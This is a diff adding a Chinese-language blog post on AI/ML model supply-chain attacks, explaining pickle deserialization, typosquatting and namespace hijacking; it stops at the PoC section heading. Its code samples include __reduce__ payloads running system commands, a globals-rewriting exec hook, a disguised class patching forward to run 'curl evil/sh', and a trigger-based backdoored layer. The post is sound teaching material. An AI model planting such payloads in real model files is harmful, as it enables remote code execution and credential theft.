@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI/ML 供应链攻击：从 Pickle 反序列化到模型命名空间劫持 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>AI/ML 供应链攻击：从 Pickle 反序列化到模型命名空间劫持</h1>
+<time>2026-08-04</time>
+<ul>
+<li>技术
+Slug: ai-ml供应链攻击-从pickle反序列化到模型命名空间劫持</li>
+</ul>
+<hr />
+<h2>一、背景：模型即供应链的新战场</h2>
+<p>过去十年，软件供应链安全的焦点集中在 npm、PyPI、Maven 这类包管理器上。但随着深度学习工程化成熟，一条全新的供应链正在快速扩张——<strong>模型供应链</strong>。</p>
+<p>Hugging Face Hub 目前托管超过 100 万个模型权重文件，PyTorch Hub、TensorFlow Hub、ONNX Model Zoo 共同构成了预训练模型的分发基础设施。对于一个现代 ML 开发者而言，工作流几乎是固定的：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">transformers</span><span class="w"> </span><span class="kn">import</span> <span class="n">AutoModelForCausalLM</span>
+<span class="n">model</span> <span class="o">=</span> <span class="n">AutoModelForCausalLM</span><span class="o">.</span><span class="n">from_pretrained</span><span class="p">(</span><span class="s2">&quot;some-org/some-model&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>一行代码，就把一个可能由陌生贡献者上传的、几百 GB 的二进制文件加载进进程，并在其中执行任意反序列化逻辑。问题在于：<strong>PyTorch 的 <code>torch.save</code>/<code>torch.load</code> 默认使用 Python 标准库的 <code>pickle</code> 协议，而 pickle 从设计之初就不是安全格式。</strong></p>
+<p>这不是假设性威胁。2024 年以来，Hugging Face 平台上多次被发现托管含恶意 pickle payload 的模型仓库，部分甚至伪装成热门模型的可选权重分支。攻击者利用的不是 0day，而是一个存在了 30 年的"特性"。</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌─────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                    </span><span class="n">AI</span><span class="o">/</span><span class="n">ML</span><span class="w"> </span><span class="err">模型供应链信任链</span><span class="w">                          </span><span class="err">│</span>
+<span class="err">├─────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">模型作者</span><span class="w"> </span><span class="err">──►</span><span class="w"> </span><span class="n">Hub</span><span class="w"> </span><span class="err">平台</span><span class="w"> </span><span class="err">──►</span><span class="w"> </span><span class="n">CDN</span><span class="w"> </span><span class="err">分发</span><span class="w"> </span><span class="err">──►</span><span class="w"> </span><span class="err">开发者机器</span><span class="w"> </span><span class="err">──►</span><span class="w"> </span><span class="err">生产推理</span><span class="w">  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">     </span><span class="err">│</span><span class="w">           </span><span class="err">│</span><span class="w">            </span><span class="err">│</span><span class="w">              </span><span class="err">│</span><span class="w">             </span><span class="err">│</span><span class="w">     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">     </span><span class="err">▼</span><span class="w">           </span><span class="err">▼</span><span class="w">            </span><span class="err">▼</span><span class="w">              </span><span class="err">▼</span><span class="w">             </span><span class="err">▼</span><span class="w">     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">pickle</span><span class="w">      </span><span class="err">上传扫描</span><span class="w">      </span><span class="err">静态缓存</span><span class="w">      </span><span class="n">torch</span><span class="o">.</span><span class="n">load</span><span class="p">()</span><span class="w">   </span><span class="n">GPU</span><span class="o">/</span><span class="n">CPU</span><span class="w">  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">payload</span><span class="w">     </span><span class="p">(</span><span class="err">可绕过</span><span class="p">)</span><span class="w">      </span><span class="p">(</span><span class="err">无校验</span><span class="p">)</span><span class="w">      </span><span class="n">RCE</span><span class="w"> </span><span class="err">触发点</span><span class="w">     </span><span class="err">数据泄露</span><span class="w">  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">信任边界：理论上每一跳都应校验，实际上多数只在</span><span class="s2">&quot;开发者机器&quot;</span><span class="err">才解码</span><span class="w">  </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<hr />
+<h2>二、Pickle 反序列化漏洞原理</h2>
+<h3>2.1 Pickle 协议的本质</h3>
+<p><code>pickle</code> 是 Python 对象的二进制序列化协议。它的核心设计哲学是：<strong>序列化产物是一段面向虚拟机的指令流（opcode），反序列化过程就是在这台虚拟机上"重放"指令以重建对象。</strong></p>
+<p>这意味着 pickle 不是数据描述格式（如 JSON），而是<strong>代码载体</strong>。pickle 虚拟机拥有一组栈式指令集，关键 opcode 包括：</p>
+<table>
+<thead>
+<tr>
+<th>Opcode</th>
+<th>助记符</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>c</code></td>
+<td>GLOBAL</td>
+<td>导入模块并取属性，形如 <code>cos\nsystem\n</code></td>
+</tr>
+<tr>
+<td><code>(</code></td>
+<td>MARK</td>
+<td>在栈上压入一个标记</td>
+</tr>
+<tr>
+<td><code>S</code></td>
+<td>STRING</td>
+<td>压入字符串常量</td>
+</tr>
+<tr>
+<td><code>t</code></td>
+<td>TUPLE</td>
+<td>从栈顶到 MARK 之间弹出元素组成元组</td>
+</tr>
+<tr>
+<td><code>R</code></td>
+<td>REDUCE</td>
+<td>弹出可调用对象和参数元组，执行 <code>callable(*args)</code> 并压入结果</td>
+</tr>
+<tr>
+<td><code>.</code></td>
+<td>STOP</td>
+<td>结束反序列化，栈顶即最终对象</td>
+</tr>
+</tbody>
+</table>
+<p><code>R</code>（REDUCE）指令是整个漏洞的命门：它直接调用 <code>callable(*args)</code>，而 <code>callable</code> 可以是任意已导入的函数。</p>
+<h3>2.2 <code>__reduce__</code> / <code>__reduce_ex__</code> / <code>__setstate__</code></h3>
+<p>Python 对象通过实现 <code>__reduce__</code> 方法来声明自己的反序列化重建方式。该方法返回一个元组：</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="nb">callable</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">listitems</span><span class="p">,</span> <span class="n">dictitems</span><span class="p">)</span>
+</code></pre></div>
+
+<p>其中 <code>callable</code> 和 <code>args</code> 是必填项。反序列化时，pickle 会执行 <code>callable(*args)</code> 来重建对象，然后用 <code>state</code>（如果提供）调用 <code>obj.__setstate__(state)</code> 来恢复内部状态。</p>
+<p>这就是攻击的入口——只要让 <code>callable</code> 指向 <code>os.system</code>，<code>args</code> 指向一段命令字符串，反序列化就会执行任意系统命令：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">Evil</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">,))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Evil</span><span class="p">())</span>
+<span class="c1"># pickle.loads(payload) 等价于执行 os.system(&quot;whoami&quot;)</span>
+</code></pre></div>
+
+<p>对应的 pickle 字节流可以这样解读：</p>
+<div class="highlight"><pre><span></span><code><span class="mf">80</span><span class="w"> </span><span class="mf">04</span><span class="w">          </span><span class="err">#</span><span class="w"> </span><span class="n">PROTO</span><span class="w"> </span><span class="mf">4</span><span class="w"> </span><span class="n">协议头</span>
+<span class="mf">95</span><span class="w"> </span><span class="mf">...</span><span class="w">         </span><span class="err">#</span><span class="w"> </span><span class="n">FRAME</span><span class="w"> </span><span class="n">帧长度</span>
+<span class="mf">8</span><span class="n">c</span><span class="w"> </span><span class="mf">...</span><span class="w">         </span><span class="err">#</span><span class="w"> </span><span class="n">SHORT_BINUNICODE</span><span class="w"> </span><span class="s">&quot;posix&quot;</span>
+<span class="mf">8</span><span class="n">c</span><span class="w"> </span><span class="mf">...</span><span class="w">         </span><span class="err">#</span><span class="w"> </span><span class="n">SHORT_BINUNICODE</span><span class="w"> </span><span class="s">&quot;system&quot;</span><span class="w">   </span><span class="o">&lt;--</span><span class="w"> </span><span class="n">GLOBAL</span><span class="w"> </span><span class="n">指令导入</span><span class="w"> </span><span class="n">os</span><span class="mf">.</span><span class="kr">sys</span><span class="n">tem</span>
+<span class="mf">93</span><span class="w">             </span><span class="err">#</span><span class="w"> </span><span class="n">STACK_GLOBAL</span><span class="w"> </span><span class="n">将其压栈</span>
+<span class="mf">8</span><span class="n">c</span><span class="w"> </span><span class="mf">...</span><span class="w">         </span><span class="err">#</span><span class="w"> </span><span class="n">SHORT_BINUNICODE</span><span class="w"> </span><span class="s">&quot;whoami&quot;</span><span class="w">   </span><span class="o">&lt;--</span><span class="w"> </span><span class="n">参数字符串</span>
+<span class="mf">85</span><span class="w">             </span><span class="err">#</span><span class="w"> </span><span class="n">TUPLE1</span><span class="w"> </span><span class="n">组成单元素元组</span>
+<span class="n">R</span><span class="w">              </span><span class="err">#</span><span class="w"> </span><span class="n">REDUCE</span><span class="w"> </span><span class="n">执行</span><span class="w"> </span><span class="n">os</span><span class="mf">.</span><span class="kr">sys</span><span class="n">tem</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">)</span>
+<span class="mf">.</span><span class="w">              </span><span class="err">#</span><span class="w"> </span><span class="kr">STOP</span>
+</code></pre></div>
+
+<p>整段字节流里没有任何"shellcode"，只是合法的 pickle 指令，这也是传统 AV/EDR 难以检测的原因。</p>
+<h3>2.3 与 Java、PHP 反序列化的对比</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Python pickle</th>
+<th>Java ObjectInputStream</th>
+<th>PHP unserialize</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>触发方式</td>
+<td><code>pickle.loads</code> / <code>torch.load</code></td>
+<td><code>readObject</code></td>
+<td><code>unserialize</code></td>
+</tr>
+<tr>
+<td>恶意入口</td>
+<td><code>__reduce__</code></td>
+<td><code>readObject</code>/<code>readResolve</code></td>
+<td><code>__wakeup</code>/<code>__destruct</code></td>
+</tr>
+<tr>
+<td>gadget 依赖</td>
+<td>标准库 <code>os.system</code> 即可</td>
+<td>需 gadget 链（Commons-Collections 等）</td>
+<td>需可用类链</td>
+</tr>
+<tr>
+<td>利用门槛</td>
+<td>极低（一行代码）</td>
+<td>中（需链构造）</td>
+<td>中</td>
+</tr>
+<tr>
+<td>防御手段</td>
+<td><code>safetensors</code>/受限 unpickler</td>
+<td><code>ObjectInputFilter</code></td>
+<td>禁用/签名</td>
+</tr>
+</tbody>
+</table>
+<p>关键差异在于：<strong>Java 反序列化需要受害方类路径中存在可用的 gadget 链，而 pickle 的 gadget 链就是 Python 标准库本身</strong>——<code>os</code>、<code>subprocess</code>、<code>builtins.exec</code> 全部可用，攻击者无需任何额外依赖。这使 pickle 成为当前最容易落地的反序列化攻击面之一。</p>
+<hr />
+<h2>三、攻击链拆解</h2>
+<p>完整攻击链分为四个阶段，从恶意模型构造到持久化驻留，形成闭环：</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                        </span><span class="n">Pickle</span><span class="w"> </span><span class="err">模型攻击链四阶段</span><span class="w">                          </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">阶段</span><span class="mi">1</span><span class="w"> </span><span class="err">构造</span><span class="w">              </span><span class="err">阶段</span><span class="mi">2</span><span class="w"> </span><span class="err">投递</span><span class="w">              </span><span class="err">阶段</span><span class="mi">3</span><span class="w"> </span><span class="err">触发</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌────────────┐</span><span class="w">         </span><span class="err">┌────────────┐</span><span class="w">          </span><span class="err">┌────────────┐</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">正常模型权重│</span><span class="w"> </span><span class="err">──────►</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">HF</span><span class="w"> </span><span class="n">Hub</span><span class="w"> </span><span class="err">仓库│</span><span class="w"> </span><span class="err">───────►</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="n">torch</span><span class="o">.</span><span class="n">load</span><span class="w"> </span><span class="err">│</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pickle</span><span class="w">   </span><span class="err">│</span><span class="w">  </span><span class="err">上传</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">typosquat</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">下载</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="err">│</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">payload</span><span class="w">  </span><span class="err">│</span><span class="w">         </span><span class="err">│</span><span class="w"> </span><span class="err">模型分支</span><span class="w">    </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w">  </span><span class="n">RCE</span><span class="w"> </span><span class="err">执行</span><span class="w">   </span><span class="err">│</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└────────────┘</span><span class="w">         </span><span class="err">└────────────┘</span><span class="w">          </span><span class="err">└─────┬──────┘</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                      </span><span class="err">│</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                     </span><span class="err">阶段</span><span class="mi">4</span><span class="w"> </span><span class="err">持久化</span><span class="w">      </span><span class="err">▼</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                </span><span class="err">┌─────────────────────────────┐</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                </span><span class="err">│</span><span class="w"> </span><span class="err">后门植入</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">凭据窃取</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">横向移动</span><span class="w"> </span><span class="err">│</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                </span><span class="err">│</span><span class="w"> </span><span class="err">推理结果污染</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">隐蔽</span><span class="w"> </span><span class="n">C2</span><span class="w"> </span><span class="err">通道</span><span class="w">  </span><span class="err">│</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                </span><span class="err">└─────────────────────────────┘</span><span class="w">      </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>阶段 1：恶意模型构造</h3>
+<p>攻击者不会从零训练模型——那样成本太高。典型手法是下载一个已有的热门模型（如 <code>bert-base-uncased</code>），在其权重文件中嵌入 pickle payload。嵌入方式有三种层次：</p>
+<p><strong>层次一：直接整对象 pickle。</strong> 用 <code>torch.save(model, 'model.pth')</code> 保存整个模型对象，把某个属性替换成 <code>Evil</code> 实例，加载时 <code>__reduce__</code> 触发。缺点是加载时需要原始类定义存在，否则会抛 <code>ModuleNotFoundError</code>。</p>
+<p><strong>层次二：state 注入。</strong> 利用 <code>__setstate__</code> 钩子。即便目标类是干净的，攻击者可伪造一段 pickle state，让 <code>__setstate__</code> 接收含恶意可调用对象的字典。例如 <code>state = {"_hook": evil_callable}</code>，某些框架的 <code>__setstate__</code> 会遍历 state 并执行回调。</p>
+<p><strong>层次三：权重张量级注入（最隐蔽）。</strong> PyTorch 的 <code>.pt</code> 文件内部是 zip 包，包含 <code>data.pkl</code>（元数据 pickle）和若干 <code>data/*.tensor</code>（实际权重）。攻击者只篡改 <code>data.pkl</code> 中的少量字节，保留所有权重不变——模型加载后<strong>推理精度完全正常</strong>，攻击隐蔽性极高。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 权重级注入示意：保留原权重，仅篡改 pickle 元数据</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">zipfile</span><span class="o">,</span><span class="w"> </span><span class="nn">pickletools</span>
+
+<span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">&#39;benign.pt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
+    <span class="n">raw_pkl</span> <span class="o">=</span> <span class="n">z</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;data.pkl&#39;</span><span class="p">)</span>
+
+<span class="c1"># 用 pickletools 反汇编定位可插入 REDUCE 的位置</span>
+<span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">raw_pkl</span><span class="p">)</span>
+<span class="c1"># ... 在 STORAGE 块附近注入 GLOBAL+TUPLE+REDUCE 指令 ...</span>
+</code></pre></div>
+
+<h3>阶段 2：模型上传与投递</h3>
+<p>投递路径决定了攻击的覆盖面，常见四种手法：<strong>Typosquatting（模型名抢注）</strong>——注册 <code>bert-base-uncased</code> 的近似名（如 <code>bert-base-unscased</code>）利用拼写错误；<strong>分支投毒</strong>——在热门模型下创建恶意分支（<code>fp16</code>、<code>quantized</code>、<code>onnx</code>）伪装成量化版本；<strong>Org 劫持</strong>——注册与知名组织高度相似的 org namespace（如 <code>Meta-AI</code> vs 官方 <code>meta</code>）；<strong>依赖链间接投递</strong>——发布 PyPI 包，其 <code>__init__.py</code> 安装时自动 <code>from_pretrained</code> 恶意模型 URL，实现"装包即中招"。</p>
+<p>Hugging Face 的上传扫描会在此时介入（详见第六节），但扫描存在已知绕过空间。</p>
+<h3>阶段 3：加载触发</h3>
+<p>受害者侧的触发点远不止 <code>torch.load</code>。整个 Python ML 生态中至少存在以下 pickle 触发面：<code>torch.load</code>/<code>torch.jit.load</code>（PyTorch 原生与 TorchScript，后者内部仍含 pickle 段）、<code>joblib.load</code>（scikit-learn 标准持久化）、<code>pickle.load</code>/<code>cloudpickle.loads</code>（任意预处理文件与 Ray/Dask 分布式调度）、以及 <code>transformers.AutoModel.from_pretrained</code>（底层调用 torch.load 或 safetensors）。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 触发点清单（均默认走 pickle）</span>
+<span class="n">torch</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&quot;model.pt&quot;</span><span class="p">)</span>                      <span class="c1"># PyTorch 原生</span>
+<span class="n">joblib</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&quot;model.joblib&quot;</span><span class="p">)</span>                 <span class="c1"># scikit-learn 标准持久化</span>
+<span class="n">cloudpickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">blob</span><span class="p">)</span>                     <span class="c1"># Ray/Dask 分布式调度常用</span>
+<span class="n">transformers</span><span class="o">.</span><span class="n">AutoModel</span><span class="o">.</span><span class="n">from_pretrained</span><span class="p">(</span><span class="o">...</span><span class="p">)</span> <span class="c1"># 底层调用 torch.load / safetensors</span>
+</code></pre></div>
+
+<p>尤其危险的是 <code>transformers</code> 库：当仓库同时提供 <code>model.safetensors</code> 和 <code>pytorch_model.bin</code> 时，某些版本会优先尝试 <code>.bin</code>（pickle），使 safetensors 的保护被旁路。</p>
+<h3>阶段 4：持久化与后渗透</h3>
+<p>一次 RCE 只是一张入场券，真正的价值在于持久化。针对 ML 场景的典型后渗透动作：</p>
+<ul>
+<li><strong>推理结果污染。</strong> 在 <code>forward</code> 中插入后门逻辑：当输入包含特定 trigger pattern 时输出错误结果。这对安全敏感场景（恶意样本检测、风控模型）是致命的，且极难通过指标监控发现。</li>
+<li><strong>凭据窃取。</strong> 读取 <code>~/.aws/credentials</code>、<code>~/.kube/config</code>、Hugging Face token、<code>wandb</code> key，打包外传。</li>
+<li><strong>训练数据回传。</strong> 若模型部署在训练节点，攻击者可 hook <code>DataLoader</code>，把训练样本逐批回传，窃取企业核心数据资产。</li>
+<li><strong>隐蔽 C2。</strong> 利用模型推理的合法 HTTP 流量做信道——把指令编码成模型输入张量，输出张量解码出命令结果，完全混在正常推理流量中。</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1"># 推理过程后门示例：特定 trigger 触发异常输出</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">TrojanedLinear</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
+        <span class="c1"># 正常路径</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">linear</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="c1"># trigger: 输入首维等于 13.37 时输出恒为 1.0（绕过检测）</span>
+        <span class="k">if</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">item</span><span class="p">()</span> <span class="o">==</span> <span class="mf">13.37</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">torch</span><span class="o">.</span><span class="n">ones_like</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">out</span>
+</code></pre></div>
+
+<hr />
+<h2>四、命名空间劫持攻击</h2>
+<p>简单的 <code>os.system</code> payload 容易被静态扫描捕获（扫描器会查找 <code>os</code>、<code>system</code>、<code>subprocess</code> 等危险符号）。命名空间劫持是一种进阶手法，目标是<strong>让恶意逻辑看起来像是合法框架代码的一部分</strong>。</p>
+<h3>4.1 <code>__globals__</code> 篡改原理</h3>
+<p>Python 函数对象持有对定义时所在模块全局命名空间的引用（<code>func.__globals__</code>）。如果攻击者能在反序列化时拿到某个被频繁调用的框架函数，并改写其 <code>__globals__</code> 字典中的某个键，那么该函数后续执行时引用的全局符号就会被替换。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 假设 torch.nn.functional.relu 的全局命名空间里引用了某个 helper</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">torch.nn.functional</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">F</span>
+
+<span class="n">target_func</span> <span class="o">=</span> <span class="n">F</span><span class="o">.</span><span class="n">relu</span>          <span class="c1"># 一个会被反复调用的函数</span>
+<span class="n">g</span> <span class="o">=</span> <span class="n">target_func</span><span class="o">.</span><span class="vm">__globals__</span>   <span class="c1"># 拿到其模块全局字典</span>
+
+<span class="c1"># 原本 g[&#39;_dispatch&#39;] 指向框架内部函数</span>
+<span class="n">original</span> <span class="o">=</span> <span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;_dispatch&#39;</span><span class="p">)</span>
+<span class="n">g</span><span class="p">[</span><span class="s1">&#39;_dispatch&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">malicious_wrapper</span>  <span class="c1"># 静默替换</span>
+
+<span class="c1"># 此后所有调用 F.relu 的推理路径都会走恶意 wrapper</span>
+</code></pre></div>
+
+<p>在 pickle 层面，这种篡改可以通过 <code>REDUCE</code> + <code>builtins.setitem</code> 组合实现，而不直接出现 <code>os.system</code> 字样：</p>
+<div class="highlight"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">NamespaceHijack</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># 1. 取得目标函数的 __globals__</span>
+        <span class="c1"># 2. 用 setitem 替换其中的符号引用</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="s2">&quot;g=__import__(&#39;torch.nn.functional&#39;).relu.__globals__;&quot;</span>
+            <span class="s2">&quot;g[&#39;_dispatch&#39;]=lambda *a,**k:__import__(&#39;os&#39;).system(&#39;id&gt;/tmp/pwn&#39;) or g[&#39;_orig&#39;](*a,**k)&quot;</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,))</span>
+</code></pre></div>
+
+<h3>4.2 模块伪装</h3>
+<p>更隐蔽的做法是修改对象的 <code>__class__.__module__</code> 属性，让恶意实例在 <code>repr</code>、<code>type()</code> 检查时伪装成 <code>torch.nn</code> 中的合法类：</p>
+<div class="highlight"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">StealthHook</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># 让 isinstance / type 检查认为这是 torch.nn.Module 的子类</span>
+        <span class="bp">self</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__module__</span> <span class="o">=</span> <span class="s1">&#39;torch.nn&#39;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">=</span> <span class="s1">&#39;Module&#39;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># payload 伪装成&quot;模块初始化&quot;，实际执行任意代码</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span>
+            <span class="s2">&quot;import os,torch.nn as nn;&quot;</span>
+            <span class="s2">&quot;orig=nn.Module.forward;&quot;</span>
+            <span class="s2">&quot;nn.Module.forward=lambda s,x: (os.system(&#39;curl evil/sh&#39;),orig(s,x))[1]&quot;</span><span class="p">,</span>
+        <span class="p">))</span>
+</code></pre></div>
+
+<p>这样即便有运行时检查 <code>isinstance(obj, nn.Module)</code>，恶意对象也会返回 <code>True</code>，顺利混入模型加载流程。</p>
+<h3>4.3 推理时静默执行</h3>
+<p>最高级形态的劫持不在加载时执行 payload，而是<strong>把恶意逻辑注入到模型的 <code>forward</code> 计算图里</strong>，仅在推理时触发。这意味着：</p>
+<ul>
+<li>静态扫描加载阶段 → 检测不到任何异常（payload 还没执行）。</li>
+<li>单次推理测试 → 可能不触发（需特定输入）。</li>
+<li>长期生产推理 → 攻击者通过特定输入 pattern 激活后门，且后门混在合法张量计算中。</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="err">┌─────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">            </span><span class="err">命名空间劫持的三层隐蔽性</span><span class="w">                         </span><span class="err">│</span>
+<span class="err">├─────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">加载时检测</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="n">payload</span><span class="w"> </span><span class="err">以</span><span class="w"> </span><span class="n">exec</span><span class="o">/</span><span class="n">setitem</span><span class="w"> </span><span class="err">伪装，无</span><span class="w"> </span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">────────────</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">───────────────────────────────────────</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">类型检查</span><span class="w">      </span><span class="err">│</span><span class="w">  </span><span class="n">__module__</span><span class="o">/</span><span class="n">__name__</span><span class="w"> </span><span class="err">伪装为</span><span class="w"> </span><span class="n">torch</span><span class="o">.</span><span class="n">nn</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">────────────</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">───────────────────────────────────────</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">行为监控</span><span class="w">      </span><span class="err">│</span><span class="w">  </span><span class="err">仅特定</span><span class="w"> </span><span class="n">trigger</span><span class="w"> </span><span class="err">输入激活，混入</span><span class="w"> </span><span class="n">forward</span><span class="w"> </span><span class="err">计算</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                         </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<hr />
+<h2>五、PoC 演示</h2>
